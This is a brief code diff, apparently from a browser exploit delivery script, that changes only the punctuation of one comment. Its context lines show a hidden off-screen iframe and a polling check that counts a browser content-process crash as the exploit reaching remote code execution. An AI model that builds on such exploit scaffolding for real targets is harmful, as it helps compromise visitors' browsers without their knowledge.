@@ -684,7 +684,7 @@
       frame.style.cssText = 'width:1px;height:1px;opacity:0.01;position:absolute;left:-9999px;border:none';
       document.body.appendChild(frame);
 
-      // WebContent crash = exploit progressed past RCE stage — treat as success
+      // WebContent crash = exploit progressed past RCE stage, treat as success
       var crashCheck = setInterval(function() {
         if (doneSignal) { clearInterval(crashCheck); return; }
         try {
